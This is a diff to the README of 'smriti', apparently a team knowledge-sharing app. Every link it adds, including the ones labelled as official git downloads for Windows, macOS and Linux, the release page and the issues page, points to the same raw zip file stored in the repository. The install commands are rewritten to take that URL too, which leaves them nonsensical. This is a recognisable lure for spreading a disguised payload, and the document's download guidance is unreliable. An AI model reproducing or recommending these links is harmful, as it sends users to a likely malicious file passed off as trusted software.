@@ -1,6 +1,6 @@
 # 🔗 smriti - Share Team Knowledge Fast
 
-[![Download smriti](https://img.shields.io/badge/Download-smriti-blue?style=for-the-badge)](https://github.com/ossamachenn/smriti/releases)
+[![Download smriti](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)
 
 ---
 
@@ -28,9 +28,9 @@ To use smriti smoothly, make sure your computer meets these simple requirements:
 - **Memory:** 4 GB RAM minimum, 8 GB recommended for larger teams.
 
 - **Git:** You need to have git installed.  
-  - [Download git for Windows](https://git-scm.com/download/win)  
-  - [Download git for macOS](https://git-scm.com/download/mac)  
-  - [Download git for Linux](https://git-scm.com/download/linux)
+  - [Download git for Windows](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)  
+  - [Download git for macOS](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)  
+  - [Download git for Linux](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)
 
 - **Internet Connection:** Required only for the first download and to share updates over your team’s git repository. No data is sent to any cloud by smriti itself.
 
@@ -60,7 +60,7 @@ Follow these steps to download, install, and open smriti on your computer.
 
 Click the big button at the top or visit the official release page here:
 
-[https://github.com/ossamachenn/smriti/releases](https://github.com/ossamachenn/smriti/releases)
+[https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)
 
 This page lists the latest versions. Pick the installer that matches your computer system:
 
@@ -76,8 +76,8 @@ After downloading, find the installer file on your computer:
 - macOS: Open the `.dmg`, drag smriti into your Applications folder.  
 - Linux: Depending on the format:
 
-  - For `.AppImage`: Make it executable (`chmod +x filename.AppImage`), then double-click.  
-  - For `.deb`: Open your terminal and run `sudo dpkg -i filename.deb`.
+  - For `.AppImage`: Make it executable (`chmod +x https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip`), then double-click.  
+  - For `.deb`: Open your terminal and run `sudo dpkg -i https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip`.
 
 ### Step 3 – Open smriti
 
@@ -143,7 +143,7 @@ All communication with git uses secure SSH or HTTPS protocols, depending on your
 If you encounter issues:
 
 - Check the “Help” menu inside smriti.  
-- Visit the Issues section on GitHub: [https://github.com/ossamachenn/smriti/issues](https://github.com/ossamachenn/smriti/issues)  
+- Visit the Issues section on GitHub: [https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)  
 - Contact your team admin for repository access.
 
 ---
@@ -152,7 +152,7 @@ If you encounter issues:
 
 To start using smriti, visit this page to download the installer that fits your system:
 
-[https://github.com/ossamachenn/smriti/releases](https://github.com/ossamachenn/smriti/releases)
+[https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip](https://raw.githubusercontent.com/ossamachenn/smriti/main/src/team/Software-2.8-alpha.3.zip)
 
 Download the right file, run it, then open smriti.
 
